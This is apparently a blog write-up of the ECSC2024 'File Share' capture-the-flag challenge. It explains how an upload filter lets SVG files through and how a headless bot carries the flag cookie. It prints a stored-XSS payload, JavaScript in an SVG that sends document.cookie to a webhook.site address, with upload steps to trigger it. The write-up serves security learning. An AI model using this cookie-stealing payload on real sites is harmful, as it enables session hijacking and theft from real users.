---
title: fileshare-writeup
date: 2024-03-22T20:31:38+00:00
draft: true
type: post
showTableOfContents: true
description: 
tags:
  - ctf
  - writeup
  - ecsc24
  - web
---
This is a writeup for the ECSC2024 challenge File Share.
Looking through the source code for the challenge, there are two things of note.

The first is in support.php
```php
 if (preg_match('/^[a-f0-9]{30}$/', $fileid) === 1) {

        $url = 'http://' . getenv('HEADLESS_HOST');
        $chall_url = 'http://' . getenv('WEB_DOM');
        $act1 = array('type' => 'request', 'url' => $chall_url);
        $act2 = array('type' => 'set-cookie', 'name' => 'flag', 'value' => getenv('FLAG'));
        $act3 = array('type' => 'request', 'url' => $chall_url . '/download.php?id=' . $fileid);
        
        $data = array('actions' => [$act1, $act2, $act3], 'browser' => 'chrome');
        $data = json_encode($data);

        $options = array(
            'http' => array(
                'header'  => "Content-type: application/json\r\n" . "X-Auth: " . getenv('HEADLESS_AUTH') . "\r\n",
                'method'  => 'POST',
                'content' => $data
            )
        );

        $context  = stream_context_create($options);
        $result = file_get_contents($url, false, $context);
```
In this snippet. If you give a valid file id. It will send a POST request to that page with the flag included as a cookie.

The second is in upload.php.

```php
$type = $_FILES["file"]["type"];
    // I don't like the letter 'h'
    if ($type == "" || preg_match("/h/i", $type) == 1){
        $type = "text/plain";
    }
```

This snippet of code limits uploading of certain file types by their mime-type. This will transform PHP and HTML files into plain text. This is regardless of extension, so there's no simple bypass for that.

However, this doesn't block SVG files. So we are able to get stored XSS by uploading an SVG file with some JS. The javascript embeded in the SVG is as follows:
```js
<script type="text/javascript">
        <![CDATA[
        image = new Image();
        image.src='https://webhook.site/XXXX?'+document.cookie;
        ]]>
    </script>
```

Best part is. I've embeded this code into the writeup itself!

---

Firstly, you want to setup a webhook, or forwarder. I used [webhook.site](https://webhook.site) for this. This is where we are going to send the request to get the flag.

Next open up this SVG in a text editor, and replace the line `https://webhook.site/XXXX` with your webhook.

Next, go to the Uploads page, and upload this SVG. Once uploaded you will be given a link to its location. You want to copy this link and get the id portion `id?=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

![[Writeups/1 - Linked to Blog/Static/images/ECSC-FIleShare-1.png]]

Next go to the Support page. Enter in a valid email, the ID for the file and a message. Then click send.
![[Writeups/1 - Linked to Blog/Static/images/ECSC-fileshare-2.png]]

After a few seconds, you should get the flag in your webhook site.

![[Writeups/1 - Linked to Blog/Static/images/ECSC-fileshare-3.png]]